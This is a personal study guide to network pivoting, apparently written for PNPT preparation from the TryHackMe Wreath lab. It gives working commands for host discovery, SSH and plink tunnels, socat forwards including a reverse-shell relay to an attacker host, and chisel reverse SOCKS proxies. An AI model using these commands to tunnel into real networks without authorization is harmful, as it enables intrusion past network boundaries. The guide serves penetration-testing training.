# Network Pivoting — A Practical Guide

> **Author:** Red Hacker — Dalia Almutairi
> Part of my PNPT journey. Built from hands-on practice (TryHackMe *Wreath*), written to teach it back to myself so it sticks.

---

## 1. What is pivoting? (the mental model that finally made it click)

I used to picture pivoting as *jumping* from machine to machine, like teleporting my session. **That is wrong.** Here is the real picture:

Think of a company building:

- The **public web server** (e.g. `10.200.180.200`) is the **reception desk**. It faces the street — I can reach it from outside.
- The **internal machines** (`.150`, `.100`) are **back offices**. They have **no street door** — from the outside I cannot reach them at all.

The attack:

1. I break into **reception** (exploit the public server) → I now have a **foothold**.
2. Reception **can talk to the back offices** (same internal network). But **I, from my own Kali, still cannot.**
3. **Pivoting = I build a tunnel *through* reception**, so my tools at home can reach the back offices by **routing through the machine I already own.**

> **Key insight:** I never move my session to another box. **I stay on my attacking machine. I route my traffic THROUGH the compromised machine** to reach the hidden ones. Every pivoting tool below is just a different way to build that tunnel.

---

## 2. When do I pivot?

A penetration tester and an attacker use the **identical** technique — one is authorized, one is not. The moment to reach for a pivot tool is the same for both:

> **You have compromised one machine (a foothold) that can reach a hidden internal network you cannot touch directly.**

If I can already reach the target from my own machine, I **don't** pivot. I pivot **only** when a machine I control is my **only bridge** to the next targets.

---

## 3. Phase 1 — Enumerate from the foothold

First job after landing on the pivot: learn what is around me. Five ways, quietest first:

1. Material already **on the machine** — hosts file, ARP cache, DNS config
2. **Pre-installed tools** — e.g. Nmap if it is there (Living off the Land)
3. **Static binaries** I upload (no dependencies needed)
4. **Scripting** — a Bash ping sweep
5. **Local tools through a proxy** — slowest, last resort

### Quiet recon — read what's already there (no scanning)

| What | Linux | Windows |
|------|-------|---------|
| Neighbours talked to | `arp -a` | `arp -a` |
| Static host mappings | `/etc/hosts` | `C:\Windows\System32\drivers\etc\hosts` |
| DNS servers | `/etc/resolv.conf` | `ipconfig /all` |

> `arp -a` only shows machines **this box has already talked to**. Useless on a fresh box, gold on a real internal server — it reveals the hidden machines. *The command is the skill; the target changes.*

### Ping sweep — find live hosts (Bash, no tools)

```bash
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

Read it as a sentence: *for every number 1–255, ping it once, keep only the "bytes from" (alive) lines, run them all in the background for speed.*

> **Gotcha:** a failed ping does **NOT** mean a dead host — Windows blocks ICMP by default. If a box seems down but might be alive, check ports instead (`nmap -Pn`, netcat).

---

## 4. Phase 2 — Tunnel through the pivot

Once I know what's behind the pivot, I tunnel my tools through it.

### 4.1 proxychains & FoxyProxy

Most tools can't use a SOCKS proxy on their own. These two fix that:

- **proxychains** → forces **command-line tools** through the proxy: `proxychains nmap -sT -Pn <target>`
- **FoxyProxy** → does the same for the **browser**

Config lives in `/etc/proxychains4.conf`. The line that matters, at the bottom under `[ProxyList]`:

```
socks5  127.0.0.1  1080
```

`type  host  port` → the proxy is always on **`127.0.0.1`** (my own machine), on whatever port my tunnel opened.

> Through a proxy use `-sT` (full TCP connect) and `-Pn`. A `-sS` half-open scan and ICMP ping do **not** work over a TCP proxy. No UDP either.

### 4.2 SSH tunnelling (`-L` / `-R` / `-D`)

An SSH connection is an encrypted pipe — I can push other traffic through it. Three flavours, decided by **one question: "Can I SSH *into* the target?"**

| Switch | Meaning | Use when |
|--------|---------|----------|
| `-L` **Local** | Pull **one** remote service to me | I can SSH into the target, want one service |
| `-D` **Dynamic** | A **SOCKS proxy** for everything (feeds proxychains) | I can SSH into the target, want the whole network |
| `-R` **Reverse** | The target reaches **back** to me | I only have a **shell** on the target, no SSH login |

```bash
# Local: reach an internal service on my own port
ssh -L 8000:172.16.0.100:80 user@PIVOT -fN

# Dynamic: build the SOCKS proxy (the highway)
ssh -D 1080 user@PIVOT -fN

# Reverse: shell on target, no SSH in — it comes to me (throwaway key!)
ssh -R 2222:172.16.0.100:22 user@ATTACKER -i id_rsa -fN
```

- **`-fN`** = `-f` background + `-N` no command. *(lowercase `f`, capital `N` — `-F` is a different switch.)*
- **Shell ≠ SSH access.** `-L`/`-D` need an SSH *login* into the target; a shell alone → `-R`.
- For `-R`, the target authenticates to **me**, so I use a **throwaway key** (`ssh-keygen`), never my real password.

### 4.3 plink.exe (SSH tunnelling from a Windows pivot)

`plink.exe` = PuTTY's command-line SSH client **for Windows**. Older Windows has no built-in `ssh`, so I upload `plink.exe` and use it to build the same reverse tunnel.

```cmd
cmd.exe /c echo y | plink.exe -R 2222:127.0.0.1:22 user@ATTACKER -i key.ppk
```

- Maps 1:1 to `ssh -R` — just the Windows client.
- PuTTY uses **`.ppk`** keys → convert with `puttygen KEYFILE -o OUTPUT.ppk`.
- `cmd.exe /c echo y |` auto-accepts the host-key prompt.
- Modern Windows ships `ssh`, so plink is mainly for **older** boxes.

### 4.4 socat (single pipe — port forwards & relays)

**socat = a pipe that joins two points. What goes in one end comes out the other.** Every command is `socat <POINT A> <POINT B>`, where a point is either:

- `tcp-l:PORT` → *listen here*
- `tcp:IP:PORT` → *connect there*

Options for a forward: `fork` (handle many connections), `reuseaddr` (keep the port reusable).

```bash
# Port forward: open 33060 on the pivot, send to an internal DB
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

# Reverse-shell relay: catch a shell on 8000, bounce it home to my 443
./socat tcp-l:8000 tcp:172.16.0.200:443
```

**Encrypted version (OpenSSL):** a plain socat pipe is plaintext — a sniffer reads it. Swap `tcp-l`/`tcp` for `openssl-listen`/`openssl` to wrap the pipe in TLS.

```bash
# Make a self-signed cert first
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
cat key.pem cert.pem > server.pem

# Encrypted forward
socat openssl-listen:9443,cert=server.pem,verify=0,fork,reuseaddr tcp:127.0.0.1:8000 &
```

> socat forwards **specific ports** (one service). It is **not** a full proxy.

### 4.5 chisel (the highway — a SOCKS proxy with no SSH)

**chisel builds a full SOCKS proxy over HTTP, no SSH needed.** Two parts:

```
SERVER (my side):   ./chisel server -p PORT --reverse
CLIENT (pivot side): ./chisel client MY_IP:PORT  <request>
```

The client's `<request>` is one of three:

- `R:socks` → a **SOCKS proxy** (the highway — pair with proxychains)
- `R:LPORT:TARGET:TPORT` → a **remote** port forward
- `LPORT:TARGET:TPORT` → a **local** port forward (no `R:`)

```bash
# On my attacking machine — the server
./chisel server -p 4242 --reverse

# On the compromised pivot — SOCKS proxy back to me
./chisel client 172.16.0.200:4242 R:socks &

# Remote port forward (one service)
./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

# Local port forward (note: no R:)
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```

Once `R:socks` is up, the proxy is on `127.0.0.1:1080` → drop `socks5 127.0.0.1 1080` into proxychains and run `proxychains nmap ...`. This is why *Wreath* makes chisel the main pivot tool: real targets rarely give you SSH, and chisel doesn't care.

---

## 5. Toolkit at a glance

| Tool | Gives me | Needs SSH? | Best for |
|------|----------|-----------|----------|
| `ssh -L` | One forwarded service | Yes (into target) | Reach a single internal service |
| `ssh -D` | SOCKS proxy (everything) | Yes (into target) | Whole network, all tools |
| `ssh -R` | Reverse tunnel | No (shell only) | Shell on target, no SSH in |
| `plink.exe` | SSH tunnel from Windows | Client only | Old Windows pivot |
| `socat` | Single port forward / relay | No | One service, or relay a shell |
| **`chisel`** | **SOCKS proxy over HTTP** | **No** | **The main pivot — all tools, no SSH** |

---

## 6. Key lessons I don't want to forget

- Pivoting = **route through** a machine I own, not jump to it.
- Enumerate quietly first (`arp -a`, hosts file, `resolv.conf`) before any scanning.
- A failed ping ≠ a dead host (Windows blocks ICMP → use `-Pn`).
- `127.0.0.1` = my own machine; `172.16.x` = the target network. One digit apart — don't swap them.
- A **shell** is not an **SSH login** → that's when `-R` is the answer.
- `-D` / chisel `R:socks` = the highway (all tools); `-L` / socat = a single pipe (one service).
- Plaintext (telnet, plain socat) vs encrypted (SSH, socat+OpenSSL) — same choice, every time: encrypted is the stealthy one.

---

*Written as a learning writeup — the goal is to need it less each time I read it.*
